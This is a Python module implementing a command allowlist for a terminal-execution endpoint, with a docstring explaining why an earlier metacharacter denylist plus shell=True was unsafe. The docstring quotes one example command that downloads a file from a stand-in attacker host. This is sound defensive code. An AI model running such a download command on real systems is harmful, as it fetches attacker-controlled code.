"""Command registry for /v1/terminal/execute — allowlist, not denylist.

What this replaces
------------------
`os/terminal/service.py` used to screen commands with a denylist of shell
metacharacters (``; && | ` $( \\n``) and then hand the raw string to
``subprocess.run(..., shell=True)``. Two problems, and the second is the bigger
one:

1. The denylist leaked. It did not cover ``&`` (background), ``>`` / ``<``
   (redirection), ``~`` expansion or globbing, and it was skipped entirely for
   the ADMIN policy.
2. Even with zero metacharacters, ALLOW permitted **any executable with any
   arguments** — ``curl http://evil/x -o /tmp/x`` contains nothing the denylist
   looked for. Blocking chaining was never the same as blocking execution.

So the primitive itself goes: commands are resolved to an argv list and run with
``shell=False``. There is no shell to inject into. A command that is not
registered here does not run, whatever it looks like.

Extending the registry is a code change on purpose. A config knob that widens a
security boundary at runtime is the kind of default that turns an allowlist back
into an allow-anything.
"""
from __future__ import annotations

import os
import re
import shlex
import shutil
import sys
from dataclasses import dataclass, field


class CommandRejected(Exception):
    """The command is not permitted. Carries the reason shown to the caller."""


@dataclass(frozen=True)
class CommandSpec:
    """One registered command.

    `max_args` and `arg_pattern` are both enforced: an argument list that is too
    long, or any single argument that does not fully match the pattern, is
    rejected. The default is the strictest possible — no arguments at all.
    """

    name: str
    max_args: int = 0
    arg_pattern: str | None = None
    admin_only: bool = False
    platforms: tuple[str, ...] = field(default_factory=tuple)  # empty = every platform

    def available_here(self) -> bool:
        return not self.platforms or sys.platform in self.platforms


# Read-only, informational commands only. Nothing here writes, deletes, opens a
# network connection or spawns another program.
_FLAGS_ONLY = r"-[A-Za-z]{1,8}"

_REGISTRY: dict[str, CommandSpec] = {
    "whoami": CommandSpec("whoami"),
    "hostname": CommandSpec("hostname"),
    "uname": CommandSpec("uname", max_args=1, arg_pattern=_FLAGS_ONLY, platforms=("linux", "darwin")),
    "id": CommandSpec("id", max_args=1, arg_pattern=_FLAGS_ONLY, platforms=("linux", "darwin")),
    "systeminfo": CommandSpec("systeminfo", platforms=("win32",)),
    "tasklist": CommandSpec("tasklist", admin_only=True, platforms=("win32",)),
}


def registered_commands(include_admin: bool = False) -> list[str]:
    """Names a caller may use here, for error messages and documentation."""
    return sorted(
        spec.name
        for spec in _REGISTRY.values()
        if spec.available_here() and (include_admin or not spec.admin_only)
    )


def _split(command: str) -> list[str]:
    """Tokenise without a shell.

    POSIX rules everywhere: the registered commands take flags, never paths, so
    the backslash handling that would matter on Windows paths does not arise —
    and posix mode is the predictable one.
    """
    try:
        return shlex.split(command)
    except ValueError as exc:  # unbalanced quotes
        raise CommandRejected(f"could not parse command: {exc}") from exc


def resolve(command: str, policy: str = "ALLOW") -> list[str]:
    """Validate `command` against the registry and return argv to execute.

    Raises CommandRejected with a caller-safe reason. Never returns a string:
    the result is meant for `subprocess.run(argv, shell=False)`.
    """
    parts = _split(command)
    if not parts:
        raise CommandRejected("empty command")

    name = parts[0]
    lookup = name.lower() if os.name == "nt" else name
    spec = _REGISTRY.get(lookup)
    if spec is None:
        raise CommandRejected(
            f"command not in allowlist: {name!r}. "
            f"Permitted: {', '.join(registered_commands(include_admin=True)) or '(none on this platform)'}"
        )
    if not spec.available_here():
        raise CommandRejected(f"command {spec.name!r} is not available on {sys.platform}")
    if spec.admin_only and policy.upper() != "ADMIN":
        raise CommandRejected(f"command {spec.name!r} requires the ADMIN policy")

    args = parts[1:]
    if len(args) > spec.max_args:
        raise CommandRejected(
            f"command {spec.name!r} accepts at most {spec.max_args} argument(s), got {len(args)}"
        )
    if args:
        if spec.arg_pattern is None:
            raise CommandRejected(f"command {spec.name!r} accepts no arguments")
        for arg in args:
            if not re.fullmatch(spec.arg_pattern, arg):
                raise CommandRejected(f"argument {arg!r} rejected for {spec.name!r}")

    executable = shutil.which(spec.name)
    if not executable:
        raise CommandRejected(f"command {spec.name!r} is registered but not installed here")
    return [executable, *args]
